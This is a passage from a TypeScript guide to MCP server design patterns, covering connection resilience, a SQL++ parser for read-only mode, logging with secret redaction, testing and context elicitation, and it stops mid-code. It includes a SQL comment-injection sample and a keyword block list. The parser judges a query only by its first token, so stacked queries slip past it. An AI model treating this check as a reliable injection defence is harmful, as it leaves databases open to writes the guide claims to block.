Two resilience patterns work together: **exponential backoff** spaces out retry attempts to avoid overwhelming a recovering backend, and a **circuit breaker** stops retries entirely when repeated failures indicate the backend is genuinely down rather than experiencing a transient issue. A **health check loop** provides ongoing monitoring with automatic reconnection.

### Reference Implementation

**Exponential backoff with circuit breaker:**

```typescript
// src/index.ts
async function connectWithBackoffAndCircuitBreaker(
  maxAttempts = 10,
  baseDelayMs = 1000,
  maxDelayMs = 30000,
  circuitBreakerThreshold = 5,
  circuitBreakerCooldownMs = 60000,
) {
  let failures = 0;

  for (let attempt = 1; attempt <= maxAttempts; attempt++) {
    try {
      await connectionManager.initialize();
      return; // Connected
    } catch (err) {
      failures++;
      logger.error(
        `Connection failed (attempt ${attempt}/${maxAttempts}): ${
          err instanceof Error ? err.message : String(err)
        }`,
      );

      if (failures >= circuitBreakerThreshold) {
        logger.error(
          `Circuit breaker tripped. Pausing for ${circuitBreakerCooldownMs / 1000}s`,
        );
        await sleep(circuitBreakerCooldownMs);
        failures = 0; // Reset after cooldown
      } else {
        const delay = Math.min(baseDelayMs * 2 ** (attempt - 1), maxDelayMs);
        await sleep(delay);
      }
    }
  }

  throw new Error("Failed to connect after multiple attempts");
}
```

**Delay progression (default settings):**

| Attempt | Delay | Cumulative |
|---------|-------|------------|
| 1 | 1s | 1s |
| 2 | 2s | 3s |
| 3 | 4s | 7s |
| 4 | 8s | 15s |
| 5 | Circuit breaker: 60s pause | 75s |
| 6 | 1s (reset) | 76s |

**Connection manager with health check loop:**

```typescript
// src/lib/connectionManager.ts
class ConnectionManager {
  private static instance: ConnectionManager;
  private isHealthy = false;
  private healthCheckInterval: NodeJS.Timeout | null = null;
  private initializationPromise: Promise<void> | null = null;

  // Singleton -- prevents concurrent initialization races
  static getInstance(): ConnectionManager {
    if (!ConnectionManager.instance) {
      ConnectionManager.instance = new ConnectionManager();
    }
    return ConnectionManager.instance;
  }

  // Deduplicates concurrent initialize() calls
  async initialize(): Promise<void> {
    if (!this.initializationPromise) {
      this.initializationPromise = this.initializeConnection();
    }
    return this.initializationPromise;
  }

  private startHealthCheck(): void {
    this.healthCheckInterval = setInterval(async () => {
      try {
        await this.client.ping();
        this.isHealthy = true;
      } catch {
        this.isHealthy = false;
        // Attempt reconnection
        try {
          await this.initializeConnection();
        } catch {
          logger.error("Reconnection failed during health check");
        }
      }
    }, 30000);
  }

  async close(): Promise<void> {
    if (this.healthCheckInterval) clearInterval(this.healthCheckInterval);
    await this.client.close();
    this.isHealthy = false;
    this.initializationPromise = null;
  }
}
```

**Key design decisions:**

| Decision | Rationale |
|----------|-----------|
| Singleton pattern | Prevents multiple connection instances competing for resources |
| Cached `initializationPromise` | Multiple callers await the same promise instead of racing |
| Health check on interval | Detects backend recovery without waiting for a tool call to fail |
| Circuit breaker reset after cooldown | Gives backend time to recover before resuming retries |
| `maxDelayMs` cap | Prevents backoff from growing unbounded |

---

## 21. Parser-Based Query Security

### Pattern

Section 7 covers regex-based injection detection, which works well for simple string inputs. For tools that accept full query strings (SQL, N1QL, SQL++), regex patterns produce false positives on legitimate queries and false negatives on sophisticated injections. A parser-based approach tokenizes the query with quote-awareness, removes comments, identifies clauses, and classifies queries semantically.

The parser does not replace regex-based validation -- it supplements it for query-accepting tools. Use regex validation (Section 7) on simple string parameters. Use the parser on query parameters where the input is expected to be a structured query.

### Reference Implementation

```typescript
// src/lib/sqlppParser.ts
class SQLPPParser {
  private readonly dataModificationKeywords = new Set([
    "INSERT", "UPDATE", "DELETE", "UPSERT", "MERGE",
  ]);

  private readonly structureModificationKeywords = new Set([
    "CREATE", "DROP", "ALTER", "GRANT", "REVOKE",
  ]);

  parse(query: string): ASTNode {
    const cleaned = this.removeComments(query);
    const tokens = this.tokenize(cleaned);
    return this.buildAST(tokens);
  }

  modifiesData(parsed: ASTNode): boolean {
    if (!parsed.rawQuery) return false;
    const firstToken = this.tokenize(parsed.rawQuery.toUpperCase())[0];
    return this.dataModificationKeywords.has(firstToken);
  }

  modifiesStructure(parsed: ASTNode): boolean {
    if (!parsed.rawQuery) return false;
    const firstToken = this.tokenize(parsed.rawQuery.toUpperCase())[0];
    return this.structureModificationKeywords.has(firstToken);
  }

  // Quote-aware tokenizer: handles single, double, and backtick quotes
  private tokenize(query: string): string[] {
    const tokens: string[] = [];
    let current = "";
    let inQuotes = false;
    let quoteChar = "";

    for (let i = 0; i < query.length; i++) {
      const char = query[i];

      if ((char === '"' || char === "'" || char === "`") && query[i - 1] !== "\\") {
        if (!inQuotes) {
          inQuotes = true;
          quoteChar = char;
        } else if (char === quoteChar) {
          inQuotes = false;
        }
      }

      if (char === " " && !inQuotes) {
        if (current) tokens.push(current);
        current = "";
      } else {
        current += char;
      }
    }

    if (current) tokens.push(current);
    return tokens;
  }

  private removeComments(query: string): string {
    let cleaned = query.replace(/--.*$/gm, "");       // Single-line
    cleaned = cleaned.replace(/\/\*[\s\S]*?\*\//g, ""); // Multi-line
    return cleaned.trim();
  }
}
```

**Integration with read-only mode:**

```typescript
// src/tools/query/execute_query.ts
const handler = async (params, client) => {
  const parser = new SQLPPParser();
  const parsed = parser.parse(params.query);

  if (config.readOnlyMode) {
    if (parser.modifiesData(parsed)) {
      throw new McpError(
        ErrorCode.InvalidRequest,
        "Data modification queries are blocked in read-only mode",
      );
    }
    if (parser.modifiesStructure(parsed)) {
      throw new McpError(
        ErrorCode.InvalidRequest,
        "Structure modification queries are blocked in read-only mode",
      );
    }
  }

  return await client.executeQuery(params.query);
};
```

**Parser vs regex comparison:**

| Scenario | Regex result | Parser result |
|----------|-------------|---------------|
| `SELECT * FROM users WHERE name = 'O''Brien'` | False positive (quotes) | Correct (quote-aware tokenizer) |
| `SELECT * FROM users -- WHERE admin = true` | Misses comment injection | Correct (comment removal) |
| `DELETE FROM users` | Catches keyword | Catches keyword + classifies as data modification |
| `SELECT * FROM users WHERE role = 'DELETE'` | False positive (keyword in string) | Correct (keyword in quotes is data, not command) |

---

## 22. Progress Reporting

### Pattern

Long-running MCP tool operations (bulk data exports, complex queries, index rebuilds) benefit from progress reporting. The MCP protocol supports `$/progress` notifications that clients can use to display progress indicators. The pattern is simple: if the tool receives a progress token in its `extra` context, it sends periodic notifications. If no token is present, it stays silent.

Progress reporting failures must never break tool execution. If the notification fails (client disconnected, transport error), the tool continues normally.

### Reference Implementation

```typescript
// src/lib/progressReporting.ts
import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";

async function reportProgress(
  server: McpServer,
  token: string | number | undefined,
  progress: { percentage: number; message?: string },
): Promise<void> {
  if (!token) return; // No token = no reporting

  try {
    await server.notify("$/progress", {
      token,
      value: {
        percentage: progress.percentage,
        message: progress.message || `Operation ${progress.percentage}% complete`,
      },
    });
  } catch {
    // Progress reporting failure must not break tool execution
  }
}
```

**Usage in a tool handler:**

```typescript
// src/tools/data/export_collection.ts
const handler = async (params, extra) => {
  const progressToken = extra?._meta?.progressToken;
  const totalDocs = await client.count(params.collection);
  let processed = 0;

  await reportProgress(server, progressToken, {
    percentage: 0,
    message: `Starting export of ${totalDocs} documents`,
  });

  for await (const batch of client.stream(params.collection)) {
    processed += batch.length;
    const pct = Math.round((processed / totalDocs) * 100);

    await reportProgress(server, progressToken, {
      percentage: pct,
      message: `Exported ${processed}/${totalDocs} documents`,
    });
  }

  return ResponseBuilder.success({ exported: processed }).build();
};
```

**Design principles:**

| Principle | Implementation |
|-----------|---------------|
| Opt-in | Only reports if `progressToken` is present |
| Non-blocking | Errors swallowed silently |
| Percentage-based | 0-100 scale for UI compatibility |
| Message-optional | Falls back to generic message |

---

## 23. Protocol-Integrated Logging

### Pattern

The MCP specification defines `notifications/message` as the protocol for structured log delivery. Instead of writing raw strings to stderr, the server sends typed log messages through the MCP protocol itself. The client receives structured logs with level, logger category, and data -- enabling log filtering, dashboard integration, and runtime log level control without any client-specific code.

This is fundamentally different from the raw stderr approach. With protocol-integrated logging, the client can request `logging/setLevel` to adjust verbosity at runtime. Logs carry RFC 5424 severity levels, named subsystem categories, and structured data. The server falls back to `console.error()` (stderr) only during initialization, before the MCP server is connected.

**Stdout remains banned.** The stdio transport reserves stdout exclusively for JSON-RPC messages. Any non-JSON-RPC content on stdout (including `console.log()`) corrupts the protocol stream and crashes the client connection. This rule applies regardless of whether you use protocol-integrated logging or raw stderr.

### Reference Implementation

**RFC 5424 log levels (per MCP spec):**

| Level | Numeric | When to use |
|-------|---------|-------------|
| `debug` | 0 | Detailed diagnostic information |
| `info` | 1 | Normal operational messages |
| `notice` | 2 | Significant but normal events (server ready, session start) |
| `warning` | 3 | Potential issues that do not block execution |
| `error` | 4 | Operation failures |
| `critical` | 5 | Component failures requiring attention |
| `alert` | 6 | Immediate action required |
| `emergency` | 7 | System unusable |

**Protocol-integrated logger:**

```typescript
// src/utils/mcp-logger.ts
import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";

type LogLevel = "debug" | "info" | "notice" | "warning" | "error" | "critical" | "alert" | "emergency";

interface LogContext {
  sessionId?: string;
  toolName?: string;
  [key: string]: unknown;
}

class MCPLogger {
  private minLevel: LogLevel = "info";
  private logCount = 0;
  private lastLogTime = 0;
  private rateLimitThreshold = 100; // max logs per second
  private server?: McpServer;

  private levelOrder: Record<LogLevel, number> = {
    debug: 0, info: 1, notice: 2, warning: 3,
    error: 4, critical: 5, alert: 6, emergency: 7,
  };

  initialize(server: McpServer, defaultLevel?: LogLevel): void {
    this.server = server;
    if (defaultLevel && defaultLevel in this.levelOrder) {
      this.minLevel = defaultLevel;
    }

    // Register logging/setLevel handler per MCP spec
    try {
      server.setRequestHandler(
        { method: "logging/setLevel" },
        async (request) => {
          const level = request.params?.level as LogLevel;
          if (level && level in this.levelOrder) {
            this.minLevel = level;
            this.info("logger", `Log level changed by client to: ${level}`);
            return {};
          }
          throw new Error(`Invalid log level: ${level}`);
        },
      );
    } catch {
      // Server may not be fully ready during initialization
    }
  }

  private shouldLog(level: LogLevel): boolean {
    if (this.levelOrder[level] < this.levelOrder[this.minLevel]) return false;

    // Rate limiting: prevent log storms
    const now = Date.now();
    if (now - this.lastLogTime < 1000) {
      this.logCount++;
      if (this.logCount > this.rateLimitThreshold) return false;
    } else {
      this.logCount = 1;
      this.lastLogTime = now;
    }
    return true;
  }

  private sanitizeData(data: unknown): unknown {
    if (!data || typeof data !== "object") return data;

    const sensitiveKeys = [
      "token", "password", "secret", "key", "auth",
      "credential", "authorization", "apikey", "bearer",
    ];

    function walk(obj: unknown): unknown {
      if (Array.isArray(obj)) return obj.map(walk);
      if (obj && typeof obj === "object") {
        const result: Record<string, unknown> = {};
        for (const [k, v] of Object.entries(obj as Record<string, unknown>)) {
          if (sensitiveKeys.some((s) => k.toLowerCase().includes(s))) {
            result[k] = "[REDACTED]";
          } else {
            result[k] = walk(v);
          }
        }
        return result;
      }
      return obj;
    }

    return walk(data);
  }

  private log(level: LogLevel, logger: string, message: string, context?: LogContext): void {
    if (!this.shouldLog(level)) return;

    const logData: Record<string, unknown> = { message };
    if (context && Object.keys(context).length > 0) {
      Object.assign(logData, this.sanitizeData(context));
    }

    // Send via MCP notifications/message when server is available
    if (this.server) {
      try {
        this.server.notification({
          method: "notifications/message",
          params: { level, logger, data: logData },
        });
        return;
      } catch {
        // Fall through to stderr fallback
      }
    }

    // Fallback: stderr during initialization or when MCP notification fails
    console.error(`[${level.toUpperCase()}] ${logger}: ${message}`,
      context ? this.sanitizeData(context) : "");
  }

  // Log level methods
  debug(logger: string, message: string, context?: LogContext): void { this.log("debug", logger, message, context); }
  info(logger: string, message: string, context?: LogContext): void { this.log("info", logger, message, context); }
  notice(logger: string, message: string, context?: LogContext): void { this.log("notice", logger, message, context); }
  warning(logger: string, message: string, context?: LogContext): void { this.log("warning", logger, message, context); }
  error(logger: string, message: string, context?: LogContext): void { this.log("error", logger, message, context); }
  critical(logger: string, message: string, context?: LogContext): void { this.log("critical", logger, message, context); }
  alert(logger: string, message: string, context?: LogContext): void { this.log("alert", logger, message, context); }
  emergency(logger: string, message: string, context?: LogContext): void { this.log("emergency", logger, message, context); }
}

// Singleton
export const mcpLogger = new MCPLogger();

// Legacy compatibility wrapper -- migration path from raw console.error
export const logger = {
  debug: (msg: string, ctx?: unknown) => mcpLogger.debug("legacy", msg, ctx as LogContext),
  info: (msg: string, ctx?: unknown) => mcpLogger.info("legacy", msg, ctx as LogContext),
  warn: (msg: string, ctx?: unknown) => mcpLogger.warning("legacy", msg, ctx as LogContext),
  error: (msg: string, ctx?: unknown) => mcpLogger.error("legacy", msg, ctx as LogContext),
};
```

**Usage with named categories:**

```typescript
// Per-subsystem logging with structured data
mcpLogger.debug("api", "Request sent", { endpoint: "/services", method: "GET" });
mcpLogger.info("config", "Configuration loaded", { environment: "production" });
mcpLogger.error("api", "Backend request failed", { statusCode: 404, endpoint: "/services" });
mcpLogger.notice("session", "New client connected", { clientName: "claude-desktop" });
```

**Client-controlled log level:**

The `logging/setLevel` handler allows the AI client to adjust verbosity at runtime. During debugging, the client sends `logging/setLevel` with `level: "debug"`. In normal operation, the default `info` level suppresses debug noise. This eliminates the need to restart the server with different environment variables to change log verbosity.

**Rate limiting:**

A configurable threshold (default: 100 logs/second) prevents log storms. When a tool enters a tight loop or processes bulk data, log volume can spike by orders of magnitude. The rate limiter silently drops excess messages rather than overwhelming the client or tracing pipeline.

**Sensitive data redaction:**

Before any log data leaves the server, a recursive key scanner checks for fields containing `token`, `password`, `secret`, `key`, `auth`, `credential`, `authorization`, `apikey`, or `bearer`. Matching values are replaced with `[REDACTED]`. This applies to both MCP protocol logs and stderr fallback output.

**stdio transport logging rules:**

| Output | Target | Why |
|--------|--------|-----|
| JSON-RPC messages | stdout | Protocol requirement |
| MCP `notifications/message` | stdout (via protocol) | Structured log delivery to client |
| Fallback log messages | stderr | Pre-initialization or notification failure |
| Error diagnostics | stderr | Same reason |
| `console.log` | **Banned** | Writes to stdout outside protocol, breaks JSON-RPC stream |
| `console.warn` | **Banned** | Writes to stdout in some runtimes |

---

## 24. Testing MCP Servers

### Pattern

MCP servers have a unique testing challenge: the tool handlers are registered with an SDK server object and invoked through JSON-RPC, not called directly. Tests need to either mock the server registration to capture handlers, or use the SDK's testing utilities to send real JSON-RPC requests.

The mock server pattern captures tool registrations without starting a transport. A mock backend client isolates tests from the real backend. Together they let you test handler logic, error paths, and edge cases without network dependencies.

### Reference Implementation

**Mock server that captures registrations:**

```typescript
// tests/test.utils.ts
const mockServer = {
  registeredTools: {} as Record<string, { schema: unknown; handler: Function }>,
  tool: (...args: unknown[]) => {
    let name: string, schema: unknown, handler: Function;
    if (args.length === 4) {
      [name, , schema, handler] = args as [string, string, unknown, Function];
    } else if (args.length === 3) {
      [name, schema, handler] = args as [string, unknown, Function];
    } else {
      throw new Error("Invalid tool registration signature");
    }
    mockServer.registeredTools[name] = { schema, handler };
    return mockServer;
  },
};
```

**Mock backend client:**

```typescript
// tests/test.utils.ts
class MockClient {
  private documents: Map<string, unknown> = new Map();

  async get(scope: string, collection: string, id: string) {
    const doc = this.documents.get(id);
    if (!doc) throw new Error("Document not found");
    return { content: doc };
  }

  async upsert(scope: string, collection: string, id: string, content: unknown) {
    this.documents.set(id, content);
    return { content };
  }

  async remove(scope: string, collection: string, id: string) {
    if (!this.documents.has(id)) throw new Error("Document not found");
    this.documents.delete(id);
  }

  async query(sql: string) {
    return {
      rows: Array.from(this.documents.entries()).map(([id, content]) => ({
        id,
        ...(content as object),
      })),
    };
  }
}
```

**Test structure:**

```typescript
// tests/errorHandling.test.ts
import { expect, test, describe, beforeAll, afterAll } from "bun:test";

describe("Error Handling Tests", () => {
  beforeAll(async () => {
    // Register tools with mock server
    Object.values(toolRegistry).forEach((registerTool) => {
      registerTool(mockServer, mockClient);
    });
  });

  test("should handle missing document", async () => {
    const handler = mockServer.registeredTools["get_document"].handler;
    const result = await handler({
      id: "nonexistent",
      collection: "_default",
    });
    expect(result.content[0].text).toContain("not found");
  });

  test("should validate parameters", async () => {
    const handler = mockServer.registeredTools["get_document"].handler;
    expect(handler({ id: "" })).rejects.toThrow();
  });
});
```

**Test categories for MCP servers:**

| Category | What it tests | Example |
|----------|--------------|---------|
| Error handling | Error paths, error code mapping | Missing document returns correct MCP error |
| Resources | Resource registration, URI resolution | Schema resource returns markdown |
| Edge cases | Empty inputs, type coercion, boundary values | `limit: 0`, empty query string |
| Health | Health check responses, unhealthy state | Server reports unhealthy when backend is down |
| Integration | End-to-end with real/mock backend | Full query round-trip |
| Performance | Response times, concurrent operations | 100 concurrent tool calls under threshold |

**Test file organization:**

```
tests/
  test.config.ts          # Shared configuration
  test.utils.ts           # Mock server, mock client, helpers
  errorHandling.test.ts   # Error path coverage
  resources.test.ts       # Resource registration and access
  edgeCases.test.ts       # Boundary conditions
  health.test.ts          # Health check behavior
  integration.test.ts     # End-to-end flows
  performance.test.ts     # Performance benchmarks
```

---

## 25. File-System Backed Resources

### Pattern

Some MCP servers need to expose file-system content (playbooks, documentation, configuration files) as MCP resources. The pattern scans a directory at startup, registers each file as a static resource with its own URI, and provides a directory listing resource for discovery. This is reusable for any MCP server that manages external knowledge bases.

### Reference Implementation

```typescript
// src/resources/playbookResource.ts
class PlaybookHandler {
  baseDirectory: string;
  fileExtension: string;
  playbookFiles: string[] = [];

  constructor(baseDir: string, fileExt: string = ".md") {
    this.baseDirectory = baseDir;
    this.fileExtension = fileExt;
  }

  async initialize(): Promise<void> {
    const files = await fs.readdir(this.baseDirectory);
    this.playbookFiles = files.filter((f) => f.endsWith(this.fileExtension));
  }

  async listPlaybooks() {
    let text = "# Available Playbooks\n\n";
    for (const file of this.playbookFiles) {
      const id = file.replace(new RegExp(`\\${this.fileExtension}$`), "");
      text += `- [${id}](playbook://${id})\n`;
    }
    return {
      contents: [{ uri: "playbook://", mimeType: "text/markdown", text }],
    };
  }

  async getPlaybook(id: string) {
    const fileName = `${id}${this.fileExtension}`;
    if (!this.playbookFiles.includes(fileName)) {
      return {
        contents: [{
          uri: `playbook://${id}`,
          mimeType: "text/plain",
          text: `Error: Playbook "${id}" not found`,
        }],
      };
    }
    const text = await fs.readFile(path.join(this.baseDirectory, fileName), "utf-8");
    return {
      contents: [{ uri: `playbook://${id}`, mimeType: "text/markdown", text }],
    };
  }
}

async function registerPlaybookResources(server: McpServer): Promise<void> {
  const handler = new PlaybookHandler("./playbook");
  await handler.initialize();

  // Directory listing resource
  server.resource("playbook-directory", "playbook://", async (uri) => {
    return handler.listPlaybooks();
  });

  // Individual playbook resources
  for (const file of handler.playbookFiles) {
    const id = file.replace(/\.md$/, "");
    server.resource(`playbook-${id}`, `playbook://${id}`, async (uri) => {
      return handler.getPlaybook(id);
    });
  }
}
```

**When to use file-system resources:**

| Use case | URI scheme | Content type |
|----------|-----------|-------------|
| Operational playbooks | `playbook://{name}` | text/markdown |
| API documentation | `docs://{section}` | text/markdown |
| Configuration templates | `config://{name}` | application/json |
| Migration scripts | `migration://{version}` | text/plain |

---

## 26. System Catalog Monitoring

### Pattern

Many backends expose internal system catalogs (query execution history, index metadata, cluster topology, health metrics). Building MCP tools that query these catalogs creates a reusable observability layer that AI assistants can use to diagnose issues, analyze performance, and understand system state.

The pattern is to create specialized tools that query specific system catalog tables and format the results for AI consumption. Each tool focuses on one aspect of system state.

### Reference Implementation

```typescript
// src/tools/queryAnalysis/completedRequests.ts
const getCompletedRequests = createTool({
  name: "get_completed_requests",
  description: "Get recent query execution history from system catalog",
  params: z.object({
    limit: z.number().min(1).max(100).optional()
      .describe("Number of recent requests to return"),
    minDuration: z.number().optional()
      .describe("Minimum execution time in ms to filter slow queries"),
  }),
  handler: async ({ limit, minDuration }, client) => {
    let query = "SELECT * FROM system:completed_requests";
    const conditions: string[] = [];

    if (minDuration) {
      conditions.push(`elapsedTime > "${minDuration}ms"`);
    }

    if (conditions.length > 0) {
      query += ` WHERE ${conditions.join(" AND ")}`;
    }

    query += ` ORDER BY requestTime DESC LIMIT ${limit || 10}`;
    const result = await client.query(query);
    return ResponseBuilder.success(result.rows).build();
  },
});
```

**System catalog tool categories:**

| Category | System table | Tool purpose |
|----------|-------------|-------------|
| Query history | `system:completed_requests` | Find slow queries, analyze patterns |
| Index metadata | `system:indexes` | Check index usage, find missing indexes |
| Prepared statements | `system:prepareds` | List cached query plans |
| Cluster topology | `system:nodes` | Understand cluster layout |
| Health metrics | `system:vitals` | CPU, memory, connection stats |

**This pattern is backend-agnostic.** Replace `system:*` tables with your backend's equivalent:

| Backend | System catalog |
|---------|---------------|
| PostgreSQL | `pg_stat_statements`, `pg_indexes` |
| MySQL | `information_schema`, `performance_schema` |
| MongoDB | `db.serverStatus()`, `db.currentOp()` |
| Elasticsearch | `_cluster/stats`, `_cat/indices` |

---

## 27. Production Checklist

### Schema Design

- [ ] All tools use Zod schemas, not JSON Schema objects
- [ ] No `z.union([z.string().transform(), z.object()])` patterns
- [ ] Complex nested data uses `z.object({}).passthrough()`
- [ ] Every parameter has `.describe()` with meaningful text
- [ ] Optional parameters use `.optional()`, not `.default()`
- [ ] Verified: debug logs show clean objects (no escaped quotes in nested fields)

### Tool Handlers

- [ ] All handlers use `(toolArgs, extra)` signature
- [ ] `validator.parse(args)` runs at the start of every handler
- [ ] Zod validation errors produce `McpError(ErrorCode.InvalidParams)`
- [ ] Backend errors produce `McpError(ErrorCode.InternalError)`
- [ ] Not-found results produce `McpError(ErrorCode.InvalidRequest)`
- [ ] Empty inputs detected and given sensible defaults

### Architecture

- [ ] Registration function pattern: `(server, client) => void`
- [ ] Central `registerAllTools()` barrel calls all registration functions
- [ ] Universal wrapping overrides `server.registerTool()` or `server.tool()`
- [ ] All tools tracked in `registeredTools` array for `tools/list`
- [ ] Category-based module organization under `src/tools/`

### Security

- [ ] Security validation runs on all write operations
- [ ] Read-only tools are exempt from security validation
- [ ] Domain-specific exemptions defined for legitimate patterns
- [ ] Injection patterns cover SQL, command, path traversal, XSS
- [ ] Read-only mode blocks or warns on write operations (per config)

### Observability

- [ ] Trace wrapper applied to all tools via universal wrapping
- [ ] Each tool produces a trace named after itself
- [ ] Inputs and outputs captured in traces
- [ ] Tracing degrades gracefully when backend is unavailable
- [ ] Duration tracked for performance analysis

### Configuration

- [ ] Single `defaultConfig` object with all settings
- [ ] Zod schema validates without `.default()` calls
- [ ] Environment variables override individual settings
- [ ] Merge order: defaults -> env -> validation
- [ ] Config warnings logged after logger initialization

### Transport

- [ ] Both stdio and SSE modes supported
- [ ] Transport selected by `MCP_TRANSPORT` environment variable
- [ ] Graceful shutdown handlers for SIGINT and SIGTERM
- [ ] Uncaught exception and unhandled rejection handlers installed
- [ ] SSE mode drains active connections before shutdown

### Debugging

- [ ] Debug logging available via `LOG_LEVEL=debug`
- [ ] JSON-RPC test commands documented for direct tool invocation
- [ ] Parameter flow verified end-to-end during development
- [ ] Known edge cases (empty input, string coercion, comma-separated values) handled

### Resources and Prompts

- [ ] Static resources registered for fixed data (database structure, config summaries)
- [ ] Template resources registered for parameterized data (schemas, documents)
- [ ] Central `registerAllResources()` barrel calls all resource registrations
- [ ] Resource handlers return `{ contents: [...] }` (not tool response format)
- [ ] Prompts registered for domain-specific AI guidance templates
- [ ] Prompt parameters use Zod schemas with `.describe()`

### Response Builder

- [ ] Tool handlers use `ResponseBuilder.success()` / `ResponseBuilder.error()` instead of raw response construction
- [ ] Error responses automatically logged via `ResponseBuilder.error()`
- [ ] Multi-content responses use chainable `.addContent()` API

### Connection Resilience

- [ ] Exponential backoff on startup connection failure
- [ ] Circuit breaker trips after configurable failure threshold
- [ ] Health check loop with automatic reconnection
- [ ] Initialization deduplication prevents concurrent connection races
- [ ] Graceful connection close with health check cleanup

### Progress Reporting

- [ ] Long-running operations send `$/progress` notifications when token is present
- [ ] Progress failures silently swallowed (never break tool execution)
- [ ] Percentage-based progress (0-100) for client UI compatibility

### Protocol-Integrated Logging

- [ ] MCP `notifications/message` used for structured log delivery
- [ ] `logging/setLevel` handler registered for client-controlled verbosity
- [ ] Rate limiting configured (default: 100 logs/second)
- [ ] Sensitive data redacted before log data leaves server
- [ ] No `console.log` or `console.warn` calls in production code
- [ ] Stderr fallback active during initialization (before MCP server connected)
- [ ] Per-subsystem named categories (config, api, session, etc.)
- [ ] RFC 5424 log levels used (debug through emergency)

### Progressive Elicitation

- [ ] Session management for multi-step context gathering
- [ ] User autonomy preserved (decline/cancel always available)
- [ ] Confidence thresholds configured (HIGH >= 0.8, MEDIUM 0.5-0.79, LOW < 0.5)
- [ ] Zero-fallback for mandatory context (declined = operation blocked)
- [ ] Multi-source detection (user message, file paths, configuration content)
- [ ] Progressive disclosure (only ask for information not already detected)

### Enforcement Gates

- [ ] Mandatory context validated before mutating operations
- [ ] Zero-fallback enforced (no defaults for mandatory fields)
- [ ] Read operations exempt from enforcement gates
- [ ] Session-based caching for validated context
- [ ] Typed blocking errors carry missing field list and elicitation session metadata

### Tool Registry

- [ ] Uniqueness validation at startup (fails fast on duplicate method names)
- [ ] Category organization with barrel export functions
- [ ] Introspection APIs available (`getToolsByCategory`, `getToolByMethod`, `getToolStats`)
- [ ] All tools have complete structural definitions (method, name, description, parameters, category)

### Testing

- [ ] Mock server captures tool registrations without transport
- [ ] Mock backend client isolates from real backend
- [ ] Error handling test coverage for all error code paths
- [ ] Resource registration and access tests
- [ ] Edge case tests for boundary values and type coercion
- [ ] Health check tests for healthy and unhealthy states

### Deployment

| Setting | Development | Production |
|---------|------------|------------|
| `READ_ONLY_MODE` | `false` | `true` |
| `LOG_LEVEL` | `debug` | `info` |
| `BACKEND_MAX_RETRIES` | `1` | `3` |
| `MCP_TRANSPORT` | `stdio` | `sse` (web) or `stdio` (desktop) |
| Authentication | Optional | Required |
| Security validation | Enabled | Enabled |
| Tracing | Optional | Enabled |

---

## 28. Progressive Context Elicitation

### Pattern

Tool parameters are syntactically valid but operationally incomplete. A user asks to "create a service" with a valid name and URL, but the server needs to know which environment, team, and domain to tag it with. Parameter validation passes -- the Zod schema is satisfied -- but the operation cannot proceed safely without additional context.

Progressive context elicitation solves this with session-based, multi-request information gathering. Instead of rejecting the request or using unsafe defaults, the server opens an elicitation session, asks only for what it cannot detect automatically, and blocks the operation until mandatory context is provided. The user can always decline or cancel -- but declining a mandatory request blocks the operation rather than falling back to a default.

This is different from parameter validation (Section 2). Parameter validation catches malformed inputs. Elicitation gathers operational context that is correct to omit from the tool's parameter schema because it depends on the user's intent, not the tool's interface.

### Reference Implementation

**Core interfaces:**

```typescript
// src/utils/elicitation.ts
import { z } from "zod";

interface ElicitationRequest {
  id: string;
  message: string;
  schema: z.ZodSchema<unknown>;
  required: boolean;
  suggestions?: string[];
  timeout?: number;
}

interface ElicitationResponse<T = unknown> {
  requestId: string;
  data?: T;
  declined: boolean;
  cancelled: boolean;
  error?: string;
}

interface ElicitationSession {
  sessionId: string;
  requests: ElicitationRequest[];
  responses: Map<string, ElicitationResponse>;
  context: Record<string, unknown>;
  createdAt: Date;
}
```

**Elicitation manager:**

```typescript
// src/utils/elicitation.ts
class ElicitationManager {
  private sessions = new Map<string, ElicitationSession>();

  createSession(context?: Record<string, unknown>): ElicitationSession {
    const sessionId = `elicit_${Date.now()}_${Math.random().toString(36).slice(2, 11)}`;
    const session: ElicitationSession = {
      sessionId,
      requests: [],
      responses: new Map(),
      context: context || {},
      createdAt: new Date(),
    };
    this.sessions.set(sessionId, session);
    return session;
  }

  addRequest(
    sessionId: string,
    message: string,
    schema: z.ZodSchema<unknown>,
    options: { required?: boolean; suggestions?: string[] } = {},
  ): ElicitationRequest {
    const session = this.sessions.get(sessionId);
    if (!session) throw new Error(`Session ${sessionId} not found`);

    const request: ElicitationRequest = {
      id: `req_${session.requests.length + 1}`,
      message,
      schema,
      required: options.required ?? true,
      suggestions: options.suggestions,
    };
    session.requests.push(request);
    return request;
  }

  processResponse<T>(sessionId: string, requestId: string, response: Partial<ElicitationResponse<T>>): ElicitationResponse<T> {
    const session = this.sessions.get(sessionId);
    if (!session) throw new Error(`Session ${sessionId} not found`);

    // Declined/cancelled responses are stored but do not provide data
    if (response.declined || response.cancelled) {
      const final: ElicitationResponse<T> = {
        requestId, declined: response.declined || false,
        cancelled: response.cancelled || false,
      };
      session.responses.set(requestId, final);
      return final;
    }

    // Validate response data against the request's schema
    const request = session.requests.find((r) => r.id === requestId);
    if (!request) throw new Error(`Request ${requestId} not found`);

    const validated = request.schema.parse(response.data);
    const final: ElicitationResponse<T> = {
      requestId, data: validated as T, declined: false, cancelled: false,
    };
    session.responses.set(requestId, final);
    return final;
  }

  isSessionComplete(sessionId: string): boolean {
    const session = this.sessions.get(sessionId);
    if (!session) return false;
    return session.requests
      .filter((r) => r.required)
      .every((r) => {
        const resp = session.responses.get(r.id);
        return resp && !resp.declined && !resp.cancelled && resp.data !== undefined;
      });
  }

  getSessionSummary(sessionId: string): { total: number; completed: number; declined: number; pending: number } {
    const session = this.sessions.get(sessionId);
    if (!session) throw new Error(`Session ${sessionId} not found`);
    let completed = 0, declined = 0, pending = 0;
    for (const req of session.requests) {
      const resp = session.responses.get(req.id);
      if (!resp) pending++;
      else if (resp.declined || resp.cancelled) declined++;
      else if (resp.data !== undefined) completed++;
      else pending++;
    }
    return { total: session.requests.length, completed, declined, pending };
  }
}
```

**Confidence scoring with multi-source detection:**

Before eliciting information, the server analyzes available signals to determine what it already knows:

```typescript
// src/utils/context-detection.ts
interface DetectionPattern {
  name: string;
  pattern: RegExp;
  confidence: number;
  extractor: (match: RegExpMatchArray) => string;
  validator?: (value: string) => boolean;
  category: "domain" | "environment" | "team";
}

interface ContextSignal {
  value: string;
  confidence: number;
  source: string;     // "user-message", "file-path", "config-content"
  category: string;
}

class ContextDetector {
  private patterns: DetectionPattern[] = [
    {
      name: "explicit-environment",
